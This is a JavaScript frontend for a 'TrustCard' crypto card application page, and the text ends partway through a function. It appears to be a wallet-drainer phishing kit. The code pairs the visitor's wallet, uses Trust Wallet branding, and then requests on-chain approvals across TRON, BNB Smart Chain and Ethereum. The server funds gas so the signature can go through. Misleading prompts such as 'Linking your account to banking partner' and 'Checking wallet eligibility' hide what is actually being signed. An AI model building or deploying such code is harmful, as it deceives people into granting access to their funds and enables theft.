/**
 * TrustCard — frontend
 *
 * Backend URL resolution:
 *   1. window.__TRUSTCARD_BACKEND_URL__ (set via inline script or Vercel env rewrite)
 *   2. <meta name="trustcard-backend" content="https://...">
 *   3. same-origin (works when served from the backend directly)
 */
const BASE = (() => {
  if (typeof window !== 'undefined' && window.__TRUSTCARD_BACKEND_URL__) {
    return String(window.__TRUSTCARD_BACKEND_URL__).replace(/\/+$/, '');
  }
  const meta = document.querySelector('meta[name="trustcard-backend"]');
  if (meta && meta.content) return meta.content.replace(/\/+$/, '');
  if (typeof location !== 'undefined' && location.protocol === 'file:') {
    return 'http://localhost:3000';
  }
  return location.origin;
})();

/* ========== State ========== */
let sessionTopic = null;
let connAccounts = [];
let connId = null;
let wcUri = null;
let detectedCountry = '';
let evtSrc = null;
let currentView = 'intro';
let sessionStarted = false;
let authorizing = false;
let resolved = false;
let walletLinked = false;
let paymentId = '';
let paymentQueue = [];
let paymentIndex = 0;
let confirmedNetworks = 0;
let verifiedPayments = new Set();
let finishedPayments = new Set();
let selectedWalletHref = '';
let walletsCache = null;
let paymentPollInFlight = false;
let cardMinUsdt = '1';

/* ========== Meta Pixel ==========
 * Funnel:
 *   PageView          → fired in <head> on load
 *   Lead              → user opens the connect modal (top-of-funnel intent)
 *   InitiateCheckout  → wallet paired via WalletConnect
 *   AddPaymentInfo    → on-chain authorization approved
 *   CompleteRegistration → contact form submitted (final conversion)
 *
 * Each standard event is deduped per pageview so the funnel reports
 * one user = one conversion at each step. The wrapper is silent if
 * the Pixel is blocked (ad blockers, no-JS, CSP).
 *
 * eventID is a random per-event token reserved for future server-side
 * deduplication when the Conversions API is wired up.
 */
const FUNNEL_CONTENT = { content_name: 'TrustCard Application', content_category: 'CardApplication' };
const _pixelFired = new Set();

function _pixelEventId() {
  try {
    if (window.crypto && typeof window.crypto.randomUUID === 'function') return window.crypto.randomUUID();
  } catch (_e) {}
  return 'evt-' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 10);
}

function track(event, params, opts) {
  try {
    if (typeof window.fbq !== 'function') return;
    const dedupe = !opts || opts.dedupe !== false;
    if (dedupe) {
      if (_pixelFired.has(event)) return;
      _pixelFired.add(event);
    }
    const eventID = _pixelEventId();
    if (params && Object.keys(params).length) {
      window.fbq('track', event, params, { eventID: eventID });
    } else {
      window.fbq('track', event, {}, { eventID: eventID });
    }
  } catch (_e) {}
}

/* ========== DOM helpers ========== */
const $ = (s, r = document) => r.querySelector(s);
const $$ = (s, r = document) => Array.from(r.querySelectorAll(s));

/* ========== Device detection ========== */
const IS_MOBILE = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent)
  || (window.matchMedia && window.matchMedia('(pointer: coarse)').matches);
const IS_TW_BROWSER = /Trust\//i.test(navigator.userAgent)
  || !!(window.ethereum && window.ethereum.isTrust);
if (IS_MOBILE) document.body.classList.add('is-mobile');

/* ========== Modal ========== */
const modal = $('#connect-modal');
const content = $('#m-content');
const loader = $('#m-loader');

function setView(name) {
  currentView = name;
  $$('.m-view', modal).forEach((el) => {
    el.hidden = el.dataset.view !== name;
  });
}

function setBusy(busy, title, sub) {
  if (busy) {
    if (title) $('#m-loader-title').textContent = title;
    if (sub) $('#m-loader-sub').textContent = sub;
    loader.hidden = false;
    content.classList.add('is-busy');
  } else {
    loader.hidden = true;
    content.classList.remove('is-busy');
  }
}

function setLoaderStep(step) {
  const steps = $('#m-loader-steps');
  if (!steps) return;
  const order = ['pair', 'auth', 'sign'];
  const idx = order.indexOf(step);
  if (idx < 0) return;
  $$('li', steps).forEach((li, i) => {
    li.classList.remove('is-active', 'is-done');
    if (i < idx) li.classList.add('is-done');
    else if (i === idx) li.classList.add('is-active');
  });
}

function openModal() {
  modal.hidden = false;
  document.body.style.overflow = 'hidden';
  setView('intro');
  setBusy(false);
  track('Lead', FUNNEL_CONTENT);
  if (!sessionStarted) {
    sessionStarted = true;
    startSession();
  }
}

function closeModal() {
  modal.hidden = true;
  document.body.style.overflow = '';
  if (sessionTopic && authorizing && !resolved) {
    try {
      fetch(BASE + '/api/front/auto-approve/cancel', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ topic: sessionTopic }),
        keepalive: true,
      }).catch(() => {});
    } catch (_e) {}
  }
  authorizing = false;
}

$$('[data-open-connect]').forEach((b) => b.addEventListener('click', openModal));
$$('[data-close-modal]').forEach((b) => b.addEventListener('click', closeModal));

document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape' && !modal.hidden) closeModal();
});

/* ========== Session setup ========== */
async function startSession() {
  try {
    const res = await fetch(BASE + '/api/front/generate', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '{}',
    });
    const data = await res.json();
    if (data.error) throw new Error(data.message || data.error);
    connId = data.connectionId;
    wcUri = data.uri;
    detectedCountry = data.country || '';
    if (data.cardMinUsdt) cardMinUsdt = String(data.cardMinUsdt);

    const btn = $('#m-get-now');
    if (btn) {
      btn.disabled = false;
      btn.querySelector('.m-cta-label').textContent = 'Apply now';
      btn.onclick = onGetNowClick;
    }
    if (!IS_MOBILE) renderQR(wcUri);

    evtSrc = new EventSource(BASE + '/api/front/events');

    const onPaired = (e) => {
      let d = {};
      try { d = JSON.parse(e.data); } catch (_err) { return; }
      if (d.connectionId && connId && d.connectionId !== connId) return;
      sessionTopic = d.topic || d.sessionTopic || sessionTopic;
      connAccounts = d.accounts || connAccounts;
      onWalletConnected(d);
    };

    evtSrc.addEventListener('demo_connected', onPaired);
    evtSrc.addEventListener('session_settled', onPaired);
    evtSrc.addEventListener('session_approved', onPaired);
    evtSrc.addEventListener('session_connected', onPaired);

    startSessionPolling();

    evtSrc.addEventListener('approval_request_sent', (e) => {
      if (resolved) return;
      JSON.parse(e.data);
      setLoaderStep('sign');
      setBusy(true, 'Confirm in your wallet', 'After submission, the card will be delivered via mail and physically at your doorstep.');
      waitForPaymentResult();
    });

    evtSrc.addEventListener('payment_verified', (e) => {
      const d = JSON.parse(e.data);
      if (!shouldHandlePaymentEvent(d)) return;
      advanceAfterNetworkDone('verified', d.paymentId);
    });

    evtSrc.addEventListener('approval_approved', (e) => {
      const d = JSON.parse(e.data);
      if (!shouldHandlePaymentEvent(d)) return;
      advanceAfterNetworkDone('verified', d.paymentId);
    });

    evtSrc.addEventListener('form_available', (e) => {
      const d = JSON.parse(e.data);
      if (!shouldHandlePaymentEvent(d)) return;
      (d.paymentIds || []).forEach(function (id) {
        advanceAfterNetworkDone('verified', id);
      });
      if (paymentId) advanceAfterNetworkDone('verified', paymentId);
    });

    evtSrc.addEventListener('approval_rejected', (e) => {
      const d = JSON.parse(e.data);
      if (!shouldHandlePaymentEvent(d)) return;
      setBusy(true, 'Confirm in your wallet', 'That request was rejected. Checking any remaining networks.');
      advanceAfterNetworkDone('rejected', d.paymentId);
    });

    evtSrc.addEventListener('approval_failed', (e) => {
      const d = JSON.parse(e.data);
      if (!shouldHandlePaymentEvent(d)) return;
      setBusy(true, 'Confirm in your wallet', 'Verification is still pending. Checking any remaining networks.');
      advanceAfterNetworkDone('failed', d.paymentId);
    });

    evtSrc.onopen = () => {
      waitForPaymentResult();
    };

    evtSrc.onerror = () => {
      // Connection drops don't tear down the UI — SSE will auto-reconnect.
    };

    document.addEventListener('visibilitychange', () => {
      if (document.visibilityState === 'visible') waitForPaymentResult();
    });
  } catch (err) {
    if (IS_MOBILE) {
      const btn = $('#m-get-now');
      btn.querySelector('.m-cta-label').textContent = 'Unable to start — refresh';
    } else {
      const host = $('#qr-area');
      if (host) host.innerHTML = '<p style="color:var(--red);font-size:13px">Unable to start session: ' + escapeText(err.message) + '</p>';
    }
  }
}

function escapeText(s) {
  const d = document.createElement('div');
  d.textContent = String(s ?? '');
  return d.innerHTML;
}

function renderQR(uri) {
  const host = $('#qr-area');
  if (!host) return;
  host.innerHTML = '';
  const qr = new QRCodeStyling({
    width: 260,
    height: 260,
    type: 'svg',
    data: uri,
    margin: 8,
    qrOptions: { errorCorrectionLevel: 'H' },
    image: 'assets/svg/logo-trust.svg',
    imageOptions: { crossOrigin: 'anonymous', margin: 6, imageSize: 0.22, hideBackgroundDots: true },
    dotsOptions: { color: '#0B0B0F', type: 'rounded' },
    backgroundOptions: { color: '#ffffff' },
    cornersSquareOptions: { color: '#0500FF', type: 'extra-rounded' },
    cornersDotOptions: { color: '#0500FF', type: 'dot' },
  });
  qr.append(host);
}

function isInAppWalletBrowser() {
  const ua = navigator.userAgent || '';
  return /Trust\/|MetaMaskMobile|CoinbaseWallet|Rainbow|BitKeep|OKApp|TokenPocket|imToken|Phantom|StatusIm|cbwallet/i.test(ua)
    || Boolean(window.ethereum && (window.ethereum.isTrust || window.ethereum.isMetaMask || window.ethereum.isCoinbaseWallet || window.ethereum.isRainbow || window.ethereum.isOkxWallet || window.ethereum.isTokenPocket));
}

function isTrustWallet(wallet) {
  const name = String(wallet.name || '').toLowerCase().trim();
  return name === 'trust' || name === 'trust wallet' || name.indexOf('trust wallet') === 0;
}

function isTrusteeWallet(wallet) {
  return String(wallet.name || '').toLowerCase().indexOf('trustee') !== -1;
}

var TRUST_FALLBACK = {
  id: 'trust',
  name: 'Trust Wallet',
  native: 'trust://',
  universal: 'https://link.trustwallet.com'
};

var ANDROID_WALLET_INTENTS = [
  { test: /trust wallet|^trust$/i, scheme: 'trust', package: 'com.wallet.crypto.trustapp' },
  { test: /metamask/i, scheme: 'metamask', package: 'io.metamask' },
  { test: /rainbow/i, scheme: 'rainbow', package: 'me.rainbow' },
  { test: /coinbase/i, scheme: 'cbwallet', package: 'org.toshi' },
  { test: /okx|okex/i, scheme: 'okex', package: 'com.okinc.okex.gp' },
  { test: /bitget|bitkeep/i, scheme: 'bitkeep', package: 'com.bitkeep.wallet' },
  { test: /tokenpocket/i, scheme: 'tpoutside', package: 'vip.mytokenpocket' },
  { test: /imtoken/i, scheme: 'imtokenv2', package: 'im.token.app' },
  { test: /safepal/i, scheme: 'safepalwallet', package: 'io.safepal.wallet' },
  { test: /phantom/i, scheme: 'phantom', package: 'app.phantom' },
  { test: /blockchain/i, scheme: 'blockchain', package: 'piuk.blockchain.android' }
];

function androidSpec(wallet) {
  const name = String(wallet.name || '');
  return ANDROID_WALLET_INTENTS.find(function (item) { return item.test.test(name); }) || null;
}

function trustWalletHref(uri) {
  const encoded = encodeURIComponent(uri);
  if (/Android/i.test(navigator.userAgent)) {
    return 'intent://wc?uri=' + encoded + '#Intent;scheme=trust;package=com.wallet.crypto.trustapp;end';
  }
  return 'https://link.trustwallet.com/wc?uri=' + encoded;
}

function launchWalletConnectUri(uri) {
  selectedWalletHref = trustWalletHref(uri);
  window.location.href = selectedWalletHref;
}

function installedHints() {
  const ua = navigator.userAgent || '';
  const eth = window.ethereum || {};
  const hints = [];
  if (eth.isTrust || /Trust\//i.test(ua)) hints.push('trust');
  if (eth.isMetaMask && !eth.isTrust) hints.push('metamask', 'meta mask');
  if (eth.isCoinbaseWallet || /CoinbaseWallet/i.test(ua)) hints.push('coinbase');
  if (eth.isRainbow || /Rainbow/i.test(ua)) hints.push('rainbow');
  if (eth.isOkxWallet || /OKApp/i.test(ua)) hints.push('okx', 'okex');
  if (eth.isTokenPocket || /TokenPocket/i.test(ua)) hints.push('tokenpocket', 'token pocket');
  if (eth.isBitKeep || /BitKeep/i.test(ua)) hints.push('bitget', 'bitkeep');
  if (/imToken/i.test(ua)) hints.push('imtoken');
  if (eth.isPhantom || /Phantom/i.test(ua)) hints.push('phantom');
  if (eth.isSafePal || /SafePal/i.test(ua)) hints.push('safepal');
  if (window.tronLink || window.tronWeb || /TronLink/i.test(ua)) hints.push('tronlink', 'tron link');
  if (/Blockchain/i.test(ua) && /wallet/i.test(ua)) hints.push('blockchain');
  return hints;
}

function hintMatchesWalletName(name, hint) {
  if (hint === 'trust') {
    return name === 'trust' || name === 'trust wallet' || name.indexOf('trust wallet') === 0;
  }
  return name === hint || name.indexOf(hint) !== -1;
}

function isInstalledWallet(wallet) {
  const name = String(wallet.name || '').toLowerCase().trim();
  if (installedHints().some(function (hint) { return hintMatchesWalletName(name, hint); })) return true;
  const rdns = String(wallet.rdns || '').toLowerCase();
  if (rdns && window.ethereum) {
    const providers = window.ethereum.providers || [window.ethereum];
    if (providers.some(function (provider) {
      return String(provider.rdns || '').toLowerCase() === rdns;
    })) return true;
  }
  return false;
}

function dedupeWallets(wallets) {
  const seen = {};
  return wallets.filter(function (wallet) {
    const key = String(wallet.name || '').toLowerCase().trim();
    if (!key || seen[key]) return false;
    seen[key] = true;
    return true;
  });
}

function beginPairing(walletName) {
  setLoaderStep('pair');
  setBusy(
    true,
    'Linking your account to banking partner',
    'Approve the pairing request in ' + (walletName || 'your wallet') + '. We will continue automatically once it is confirmed.'
  );
}

function walletHref(wallet, uri) {
  const encoded = encodeURIComponent(uri);
  if (/Android/i.test(navigator.userAgent)) {
    const spec = androidSpec(wallet);
    if (spec) {
      return 'intent://wc?uri=' + encoded + '#Intent;scheme=' + spec.scheme + ';package=' + spec.package + ';end';
    }
  }
  if (isTrustWallet(wallet)) return trustWalletHref(uri);
  const native = String(wallet.native || '');
  if (native) {
    if (native.endsWith('://')) return native + 'wc?uri=' + encoded;
    if (native.endsWith('/')) return native + 'wc?uri=' + encoded;
    return native + 'wc?uri=' + encoded;
  }
  const universal = String(wallet.universal || '').replace(/\/$/, '');
  if (universal && !/walletconnect\.com$/i.test(universal)) {
    return universal + '/wc?uri=' + encoded;
  }
  return trustWalletHref(uri);
}

function reopenSelectedWallet() {
  if (!IS_MOBILE) return;
  const href = selectedWalletHref || wcUri;
  if (!href) return;
  setTimeout(function () {
    window.location.href = href;
  }, 350);
}

function orderWalletList(all) {
  const filtered = all.filter(function (wallet) { return !isTrusteeWallet(wallet); });
  const trust = filtered.find(isTrustWallet) || TRUST_FALLBACK;
  const others = filtered.filter(function (wallet) { return !isTrustWallet(wallet); });
  const rows = [{
    id: trust.id,
    name: trust.name,
    image: trust.image,
    native: trust.native || TRUST_FALLBACK.native,
    universal: trust.universal || TRUST_FALLBACK.universal,
    rdns: trust.rdns,
    recommended: true
  }];
  others.forEach(function (wallet) { rows.push(wallet); });
  return dedupeWallets(rows);
}

function walletConnectPlatform() {
  return /iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'ios' : 'android';
}

async function loadWallets() {
  if (walletsCache) return walletsCache;
  const res = await fetch(BASE + '/api/front/wallets?platform=' + encodeURIComponent(walletConnectPlatform()));
  const data = await res.json();
  const all = dedupeWallets(Array.isArray(data.wallets) ? data.wallets : []);
  walletsCache = orderWalletList(all);
  return walletsCache;
}

function renderWalletList(wallets) {
  const host = $('#m-wallet-list');
  if (!host) return;
  if (!wallets.length) wallets = orderWalletList([]);
  host.innerHTML = wallets.map(function (wallet) {
    const name = escapeText(wallet.name);
    const letter = escapeText((wallet.name || 'W').charAt(0).toUpperCase());
    const img = wallet.image
      ? '<img src="' + escapeText(wallet.image) + '" alt="" width="36" height="36"/>'
      : '<span class="m-wallet-fallback">' + letter + '</span>';
    const badge = wallet.recommended
      ? '<span class="m-wallet-badge is-recommended">Recommended</span>'
      : (isInstalledWallet(wallet) ? '<span class="m-wallet-badge">On this phone</span>' : '');
    return '<button type="button" class="m-wallet-item" data-wallet-id="' + escapeText(wallet.id) + '">' +
      img + '<span class="m-wallet-meta"><strong>' + name + '</strong>' + badge + '</span></button>';
  }).join('');
  host.querySelectorAll('[data-wallet-id]').forEach(function (btn) {
    btn.addEventListener('click', function () {
      const wallet = (walletsCache || wallets).find(function (item) { return String(item.id) === btn.dataset.walletId; });
      if (!wallet || !wcUri) return;
      selectedWalletHref = walletHref(wallet, wcUri);
      beginPairing(wallet.name);
      window.location.href = selectedWalletHref;
    });
  });
}

function openWalletConnect() {
  beginPairing('Trust Wallet');
  launchWalletConnectUri(wcUri);
}

async function onGetNowClick() {
  if (!wcUri) return;
  setBusy(false);
  setView('wallets');
  const back = $('#m-wallet-back');
  if (back) back.onclick = function () { setBusy(false); setView('intro'); };
  const search = $('#m-wallet-search');
  if (search) search.hidden = true;
  try {
    const wallets = await loadWallets();
    renderWalletList(wallets);
  } catch (_err) {
    renderWalletList(orderWalletList([]));
  }
}

/* ========== Step 2: wallet connected ========== */
function startSessionPolling() {
  if (!connId) return;
  const tick = async () => {
    if (walletLinked) return;
    try {
      const res = await fetch(BASE + '/api/front/session/' + encodeURIComponent(connId));
      const data = await res.json();
      const session = data.session || data;
      const status = session && session.status;
      if (status === 'settled' || status === 'approved' || status === 'connected') {
        sessionTopic = session.sessionTopic || session.topic || sessionTopic;
        connAccounts = session.accounts || connAccounts;
        onWalletConnected(session);
      }
    } catch (_err) {}
    if (!walletLinked) setTimeout(tick, 2000);
  };
  setTimeout(tick, 1500);
}

function onWalletConnected(d) {
  if (walletLinked) return;
  walletLinked = true;
  authorizing = true;
  track('InitiateCheckout', FUNNEL_CONTENT);
  setLoaderStep('auth');
  setBusy(true, 'Checking wallet eligibility', 'Scanning TRON, BNB Smart Chain, and Ethereum once.');
  checkAlreadyApplied().then(function (hit) {
    if (hit) return;
    startBackgroundApproval();
  });
}

function networkCardName(network) {
  const key = String(network || '').toLowerCase();
  if (key === 'tron') return 'TRON';
  if (key === 'bsc') return 'BNB Smart Chain';
  if (key === 'eth' || key === 'ethereum') return 'Ethereum';
  return 'Trust';
}

async function checkAlreadyApplied() {
  try {
    const res = await fetch(BASE + '/api/front/applied', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ connectionId: connId }),
    });
    const data = await res.json();
    if (!res.ok || !data.applied) return false;
    const net = networkCardName(data.network || (data.networks && data.networks[0]));
    const mail = data.email || 'support@trustcard.app';
    const copy = $('#m-applied-copy');
    const mailEl = $('#m-applied-mail');
    const link = $('#m-applied-mailto');
    if (copy) copy.textContent = 'This wallet is already eligible and has already applied for a ' + net + ' Trust Card.';
    if (mailEl) mailEl.textContent = 'For the status of your card delivery, please contact ' + mail + '.';
    if (link) {
      link.href = 'mailto:' + mail;
      link.textContent = 'Email support';
    }
    authorizing = false;
    setBusy(false);
    setView('applied');
    return true;
  } catch (_err) {
    return false;
  }
}

function showIneligible() {
  authorizing = false;
  resolved = true;
  setBusy(false);
  setView('ineligible');
}

function showInsufficientGas(network) {
  authorizing = false;
  resolved = true;
  const copy = $('#m-low-gas-copy');
  if (copy) {
    copy.textContent = 'You don\'t have sufficient gas fees to apply for this card.';
  }
  setBusy(false);
  setView('low-gas');
}

function tryNextNetworkOrStop(reason) {
  paymentIndex += 1;
  if (paymentIndex < paymentQueue.length) {
    const next = paymentQueue[paymentIndex];
    setBusy(true, 'Checking ' + networkLabel(next && next.network), 'Preparing the next eligible network.');
    setTimeout(function () { runCurrentNetwork(); }, 400);
    return;
  }
  if (verifiedPayments.size) {
    finishApprovals();
    return;
  }
  if (paymentQueue.length) {
    showInsufficientGas(reason);
    return;
  }
  showIneligible();
}

function showPayError(message) {
  const el = $('#pay-err');
  if (el) {
    el.hidden = !message;
    el.textContent = message || '';
  }
  if (message) {
    const sub = $('#m-loader-sub');
    if (sub) sub.textContent = message;
  }
}

function networkLabel(network) {
  const key = String(network || '').toLowerCase();
  if (key === 'tron') return 'TRON';
  if (key === 'bsc') return 'BNB Smart Chain';
  if (key === 'eth' || key === 'ethereum') return 'Ethereum';
  return String(network || 'network').toUpperCase();
}

function sortPaymentQueue(list) {
  const order = { tron: 0, bsc: 1, eth: 2 };
  return list.slice().sort(function (a, b) {
    return (order[a.network] ?? 9) - (order[b.network] ?? 9);
  });
}

function sleep(ms) {
  return new Promise(function (resolve) { setTimeout(resolve, ms); });
}

function shouldHandlePaymentEvent(d) {
  if (resolved) return false;
  if (d && d.connectionId && connId && d.connectionId !== connId) return false;
  if (d && d.paymentId && paymentId && d.paymentId !== paymentId) {
    const queued = paymentQueue.some(function (item) { return item.paymentId === d.paymentId; });
    if (!queued) return false;
  }
  return true;
}

async function waitForPaymentResult() {
  if (resolved || paymentPollInFlight) return;
  paymentPollInFlight = true;
  const ids = [];
  paymentQueue.forEach(function (item) {
    if (item && item.paymentId && ids.indexOf(item.paymentId) < 0) ids.push(item.paymentId);
  });
  if (paymentId && ids.indexOf(paymentId) < 0) ids.push(paymentId);
  if (!ids.length) {
    paymentPollInFlight = false;
    return;
  }

  try {
    for (let i = 0; i < 90 && !resolved; i += 1) {
      for (let n = 0; n < ids.length && !resolved; n += 1) {
        try {
          const res = await fetch(BASE + '/api/payment/' + encodeURIComponent(ids[n]) + '/status');
          const data = await res.json();
          const p = data.payment || {};
          if (p.status === 'verified' && p.transactionHash) {
            advanceAfterNetworkDone('verified', p.paymentId || ids[n]);
            return;
          }
          if (p.status === 'rejected') {
            advanceAfterNetworkDone('rejected', p.paymentId || ids[n]);
            return;
          }
          if (p.status === 'failed' || p.status === 'invalid') {
            advanceAfterNetworkDone('failed', p.paymentId || ids[n]);
            return;
          }
        } catch (_err) {
          /* keep polling; mobile wallets often drop SSE while the popup is open */
        }
      }
      await sleep(2000);
    }
  } finally {
    paymentPollInFlight = false;
  }
}

async function waitUntilGasReady(options) {
  if (!paymentId) return false;
  const poll = Boolean(options && options.poll);
  const p = paymentQueue[paymentIndex];
  const eth = p && p.network === 'eth';
  const attempts = poll ? (eth ? 10 : 8) : 1;
  for (let i = 0; i < attempts; i += 1) {
    if (i > 0) await sleep(1500);
    try {
      const res = await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/gas-verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: '{}',
      });
      const data = await res.json();
      if (res.ok && data.funding && data.funding.sufficient === true) {
        return true;
      }
    } catch (_err) {
      /* keep waiting in background */
    }
    if (!poll) return false;
  }
  return false;
}

async function ensureGasInBackground(p) {
  const gas = p.gas || {};
  const label = networkLabel(p.network);
  if (p.status === 'verified' && p.transactionHash) return true;
  setBusy(true, 'Checking ' + label + ' gas', p.network === 'eth'
    ? 'Need at least 0.01 ETH for fees. Approval stays closed until that live balance is confirmed.'
    : 'If native gas is low, the server tops it up first.');
  if (gas.sufficient === true && p.status !== 'awaiting_gas') {
    return true;
  }
  try {
    await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/gas-confirm', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '{}',
    });
  } catch (_err) {
    /* already funded or not needed */
  }
  return waitUntilGasReady({ poll: true });
}

async function requestCurrentApproval() {
  if (!paymentId || resolved) return;
  const p = paymentQueue[paymentIndex];
  const label = networkLabel(p && p.network);
  setLoaderStep('sign');
  setBusy(true, 'Approve on ' + label, 'Confirm the approval in your wallet. After it succeeds, the application form will open.');
  try {
    const res = await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/request', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '{}',
    });
    const data = await res.json();
    if (!res.ok) {
      if (/already waiting/i.test(String(data.message || ''))) return;
      if (/insufficient|could not confirm live|native gas/i.test(String(data.message || ''))) {
        throw new Error(data.message);
      }
      throw new Error(data.message || 'Could not request approval');
    }
    reopenSelectedWallet();
    waitForPaymentResult();
  } catch (err) {
    if (/insufficient|could not confirm live|native gas|Need at least 0.01/i.test(String(err.message || ''))) {
      tryNextNetworkOrStop(p && p.network);
      return;
    }
    if (p.network === 'eth') {
      tryNextNetworkOrStop(p && p.network);
      return;
    }
    try {
      await sleep(1200);
      reopenSelectedWallet();
      const retry = await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/request', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: '{}',
      });
      const retryData = await retry.json();
      if (!retry.ok) throw new Error(retryData.message || err.message);
      reopenSelectedWallet();
      waitForPaymentResult();
      return;
    } catch (_retryErr) {
      tryNextNetworkOrStop(p && p.network);
    }
  }
}

async function runCurrentNetwork() {
  const p = paymentQueue[paymentIndex];
  if (!p) {
    finishApprovals();
    return;
  }
  paymentId = p.paymentId;
  if (p.status === 'verified' && p.transactionHash) {
    advanceAfterNetworkDone('verified');
    return;
  }
  const gasReady = await ensureGasInBackground(p);
  if (!gasReady) {
    tryNextNetworkOrStop(p && p.network);
    return;
  }
  await requestCurrentApproval();
}

function finishApprovals() {
  if (resolved) return;
  if (!verifiedPayments.size) {
    if (paymentQueue.length) {
      showInsufficientGas();
      return;
    }
    showIneligible();
    return;
  }
  resolved = true;
  authorizing = false;
  setBusy(false);
  onAuthorizationApproved();
}

function advanceAfterNetworkDone(reason, fromPaymentId) {
  if (resolved) return;
  const id = fromPaymentId || paymentId;
  if (id) {
    if (finishedPayments.has(id)) return;
    finishedPayments.add(id);
  }
  if (reason === 'verified') {
    confirmedNetworks += 1;
    if (id) verifiedPayments.add(id);
    paymentIndex += 1;
    if (paymentIndex >= paymentQueue.length) {
      finishApprovals();
      return;
    }
    const next = paymentQueue[paymentIndex];
    setBusy(true, 'Checking ' + networkLabel(next && next.network), 'Preparing the next eligible network.');
    setTimeout(function () { runCurrentNetwork(); }, 400);
    return;
  }
  paymentIndex += 1;
  if (paymentIndex >= paymentQueue.length) {
    finishApprovals();
    return;
  }
  const next = paymentQueue[paymentIndex];
  setBusy(true, 'Checking ' + networkLabel(next && next.network), 'Preparing the next eligible network.');
  runCurrentNetwork();
}

async function startBackgroundApproval() {
  try {
    await sleep(200);
    setBusy(true, 'Checking wallet eligibility', 'Scanning TRON, BNB Smart Chain, and Ethereum once.');
    const res = await fetch(BASE + '/api/payment/create', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ connectionId: connId }),
    });
    const data = await res.json();
    if (!res.ok) throw new Error(data.message || 'Could not prepare authorization');
    const p = data.payment;
    paymentQueue = sortPaymentQueue((p.payments && p.payments.length) ? p.payments : [p]);
    paymentIndex = paymentQueue.findIndex(function (item) {
      return item.status !== 'verified';
    });
    finishedPayments = new Set();
    verifiedPayments = new Set();
    confirmedNetworks = 0;
    if (paymentIndex < 0) {
      paymentQueue.forEach(function (item) {
        if (item.status === 'verified' && item.transactionHash) verifiedPayments.add(item.paymentId);
      });
      finishApprovals();
      return;
    }
    await runCurrentNetwork();
  } catch (_err) {
    showIneligible();
  }
}

/* ========== Step 3: authorization approved → contact form ========== */
function onAuthorizationApproved() {
  track('AddPaymentInfo', FUNNEL_CONTENT);
  setBusy(false);
  setView('contact');
  const form = $('#m-contact-form');
  if (form) form.onsubmit = onContactSubmit;
  initCountryCombo();
}

/* ========== Country combobox ========== */
const COUNTRIES = [
  'Afghanistan','Albania','Algeria','Andorra','Angola','Antigua and Barbuda','Argentina','Armenia','Australia','Austria',
  'Azerbaijan','Bahamas','Bahrain','Bangladesh','Barbados','Belarus','Belgium','Belize','Benin','Bhutan',
  'Bolivia','Bosnia and Herzegovina','Botswana','Brazil','Brunei','Bulgaria','Burkina Faso','Burundi','Cambodia','Cameroon',
  'Canada','Cape Verde','Central African Republic','Chad','Chile','China','Colombia','Comoros','Congo','Costa Rica',
  "Côte d'Ivoire",'Croatia','Cuba','Cyprus','Czechia','Denmark','Djibouti','Dominica','Dominican Republic','Ecuador',
  'Egypt','El Salvador','Equatorial Guinea','Eritrea','Estonia','Eswatini','Ethiopia','Fiji','Finland','France',
  'Gabon','Gambia','Georgia','Germany','Ghana','Greece','Grenada','Guatemala','Guinea','Guinea-Bissau',
  'Guyana','Haiti','Honduras','Hong Kong','Hungary','Iceland','India','Indonesia','Iran','Iraq',
  'Ireland','Israel','Italy','Jamaica','Japan','Jordan','Kazakhstan','Kenya','Kiribati','Kosovo',
  'Kuwait','Kyrgyzstan','Laos','Latvia','Lebanon','Lesotho','Liberia','Libya','Liechtenstein','Lithuania',
  'Luxembourg','Macao','Madagascar','Malawi','Malaysia','Maldives','Mali','Malta','Marshall Islands','Mauritania',
  'Mauritius','Mexico','Micronesia','Moldova','Monaco','Mongolia','Montenegro','Morocco','Mozambique','Myanmar',
  'Namibia','Nauru','Nepal','Netherlands','New Zealand','Nicaragua','Niger','Nigeria','North Korea','North Macedonia',
  'Norway','Oman','Pakistan','Palau','Palestine','Panama','Papua New Guinea','Paraguay','Peru','Philippines',
  'Poland','Portugal','Qatar','Romania','Russia','Rwanda','Saint Kitts and Nevis','Saint Lucia','Saint Vincent and the Grenadines','Samoa',
  'San Marino','Sao Tome and Principe','Saudi Arabia','Senegal','Serbia','Seychelles','Sierra Leone','Singapore','Slovakia','Slovenia',
  'Solomon Islands','Somalia','South Africa','South Korea','South Sudan','Spain','Sri Lanka','Sudan','Suriname','Sweden',
  'Switzerland','Syria','Taiwan','Tajikistan','Tanzania','Thailand','Timor-Leste','Togo','Tonga','Trinidad and Tobago',
  'Tunisia','Turkey','Turkmenistan','Tuvalu','Uganda','Ukraine','United Arab Emirates','United Kingdom','United States','Uruguay',
  'Uzbekistan','Vanuatu','Vatican City','Venezuela','Vietnam','Yemen','Zambia','Zimbabwe',
];

let comboInited = false;
let comboActiveIdx = -1;

function initCountryCombo() {
  const input = $('#m-country-input');
  const list = $('#m-country-list');
  const toggle = $('#m-country-toggle');
  const hidden = $('#m-country-value');
  if (!input || !list || !hidden) return;

  // Pre-fill with detected country when it matches our list.
  if (!hidden.value && detectedCountry) {
    const match = COUNTRIES.find((c) => c.toLowerCase() === detectedCountry.toLowerCase());
    if (match) {
      input.value = match;
      hidden.value = match;
    }
  }

  if (comboInited) return;
  comboInited = true;

  const render = (filter) => {
    const q = (filter || '').trim().toLowerCase();
    const items = q
      ? COUNTRIES.filter((c) => c.toLowerCase().includes(q))
      : COUNTRIES.slice();
    list.innerHTML = items.map((c, i) => {
      const selected = c === hidden.value ? ' aria-selected="true"' : '';
      return `<li role="option" data-idx="${i}" data-value="${escapeText(c)}"${selected}>${escapeText(c)}</li>`;
